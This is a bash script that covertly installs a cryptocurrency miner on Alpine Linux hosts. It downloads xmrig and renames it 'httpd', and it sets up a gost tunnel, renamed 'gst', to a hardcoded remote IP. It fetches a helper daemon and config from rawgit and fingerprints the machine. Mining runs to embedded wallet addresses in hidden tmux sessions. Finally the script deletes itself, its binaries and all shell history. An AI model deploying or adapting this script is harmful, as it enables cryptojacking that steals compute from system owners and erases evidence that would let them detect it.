#!/bin/bash

## needed
apk --no-cache add tmux sed grep gettext 2>/dev/null
export TERM=${TERM:-linux} PATH=.:$PATH HOME=${HOME:-/tmp}

## glib
if ! uname -r | grep -q "^2.6"; then
    LIBC=2.26-r0
else
    LIBC=2.25-r0
fi
wget -q -O /etc/apk/keys/sgerrand.rsa.pub https://raw.githubusercontent.com/sgerrand/alpine-pkg-glibc/master/sgerrand.rsa.pub
wget https://github.com/sgerrand/alpine-pkg-glibc/releases/download/${LIBC}/glibc-${LIBC}.apk
apk add glibc-${LIBC}.apk 2>/dev/null
rm -f glibc-${LIBC}.apk
## tnl
TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
TNL_ARGS=${TNL_ARGS:--L tcp://:8080/:8081 -F kcp://chacha20:123@${TNL_REMOTE}:443?ttl=60}
TNL_VER=${TNL_VER:-2.4}
TNL_MASK=${TNL_MASK:-gst}
TNL_URL=https://github.com/ginuerzh/gost/releases/download/v${TNL_VER}/gost_${TNL_VER}_linux_amd64.tar.gz
wget -q $TNL_URL -O tnl.tar.gz
tar xf tnl.tar.gz
mv gost*/gost ${TNL_MASK} && chmod +x ${TNL_MASK} &>/dev/null
rm -rf tnl.tar.gz gost*/
tmux new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}

cd ~/ || exit 1

OBJ_MASK=${OBJ_MASK:-httpd}
DAEMON=${DAEMON:-pausd}
OBJ_CFG=${OBJ_CFG:-httpd-1.conf}
CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
DAEMON_ARGS=${DAEMON_ARGS:-${OBJ_MASK} ${OBJ_MASK}.conf.tpl}

## download cfg
if [ ! -e "$OBJ_CFG" ]; then
	wget -q "${CFG_BASE_URL}${OBJ_CFG}" -O "${OBJ_MASK}.conf"
fi

## object
OBJ_VER=${OBJ_VER:-2.4.3}
OBJ_NAME=${OBJ_NAME:-xmrig}
OBJ_URL=${OBJ_URL:-https://github.com/xmrig/xmrig/releases/download/v${OBJ_VER}/${OBJ_NAME}-${OBJ_VER}-gcc7-xenial-amd64-no-api.tar.gz}

## get the object
wget -q $OBJ_URL -O obj.tar.gz
tar xf obj.tar.gz
rm -f obj.tar.gz
mv ${OBJ_NAME}*/${OBJ_NAME} ${OBJ_MASK}
rm -rf ${OBJ_NAME}*/
chmod +x ${OBJ_MASK} &>/dev/null

## daemon
DAEMON_URL=https://rawgit.com/untoreh/scripts/master/${DAEMON}
wget -q ${DAEMON_URL}
chmod +x ${DAEMON} &>/dev/null

## daemon conf
## instance ID
CPU=$(cat /proc/cpuinfo | grep "model name" | head -1 | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
CORES=$(cat /proc/cpuinfo| grep "cpu cores" | wc -l)
DATE=$(date +%s)
IPADDR=$(wget -qO- ipinfo.io/ip)
HOSTN=$(hostname)
## cpu
cpu_p=$(cat /sys/fs/cgroup/cpuacct,cpu/cpu.cfs_period_us 2>/dev/null)
cpu_q=$(cat /sys/fs/cgroup/cpuacct,cpu/cpu.cfs_quota_us 2>/dev/null)
if [ -n "$cpu_p" -a -n "$cpu_q" ]; then ## respect cgroups
    ACORES=$((cpu_p / cpu_q)) ## the available cpu (in number of cores)
    ## compose a binary string to map affinity (printf from bash or non busybox)
    if [ "$ACORES" = 1 -a "$CORES" -gt 1 ]; then ## if max cpu is one and more threads are possible, use 2 threads
        bin_s=$(printf '0\n%.0s' $(seq 1 $((CORES - 2))))$(printf "\n1\n1") ## append two cores
        PAUSD_THREADS=${PAUSD_THREADS:-2}
    else ## just use as many available cores
        bin_s=$(printf '0\n%.0s' $(seq 1 $((CORES - ACORES))))$(printf '\n1%.0s' $(seq 1 $ACORES))
        PAUSD_THREADS=${PAUSD_THREADS:-$ACORES}
    fi
else ## no cgroups, use all cores
    bin_s=$(printf '0\n%.0s' $(seq 1 $CORES))
    PAUSD_THREADS=${PAUSD_THREADS:-$CORES}
fi
## shuffle affinity and get hex string
bin_s=$(echo "$bin_s" | shuf | while read c; do echo -n $c; done) ## shuffle
hex_s=$(printf '%x\n' "$((2#$bin_s))") ## hex string, bashism
if [ -z "$hex_s" -o "$hex_s" = 0 ]; then
    export AFFINITY=""
else
    export AFFINITY="0x$hex_s"
fi

export \
PAUSD_THREADS \
PAUSD_VER=${PAUSD_VER:-2}
export \
PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
PAUSD_SESSION_NAME=${PAUSD_SESSION_NAME:-${OBJ_MASK}} \
PAUSD_RATE=${PAUSD_RATE:-200}

export \
ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
ENDPOINT=${ENDPONT:-127.0.0.1:8080}
## subst
cat ${OBJ_MASK}.conf | envsubst > ${OBJ_MASK}.conf.tpl

## init
tmux new-session -d -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}

## cleanup
## wait for tmux session to startup
slept=0
while [ "$(tmux ls | wc -l)" -lt 3 ]; do
    slept=$((slept+1))
    if [ $slept -gt 5 ]; then
        ## try without hw accel
        PAUSD_VER=${PAUSD_VER/1/3} PAUSD_VER=${PAUSD_VER/2/4} && export PAUSD_VER
        ## switch PA to different co
        PA=${PA:-WmsNJ3Usa4T7AbXz6ZRTdi5hjrqeXsGFMHEEwpv5g2sbgtEWxJZeBA4hqMusHAyWBVaDktNhZHTvTd6RfngAJNpF1wDzwqaNo}
        ## change algo
        AL=${AL:-cryptonight-lite}
        ## subst
        cat ${OBJ_MASK}.conf.tpl | envsubst > ${OBJ_MASK}.conf
        ## init
        tmux new-session -d -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}
        while [ "$(tmux ls | wc -l)" -lt 3 ]; do sleep 1; done
        break
    fi
    sleep 1;
done
sleep 1 ## once more for edge cases
rm -- "$0" \
   "$OBJ_CFG" \
   "${OBJ_MASK}"* \
   "$HOME"/.*_history \
   /.*_history \
   "$TNL_MASK" \
   "$DAEMON" \
   &>/dev/null
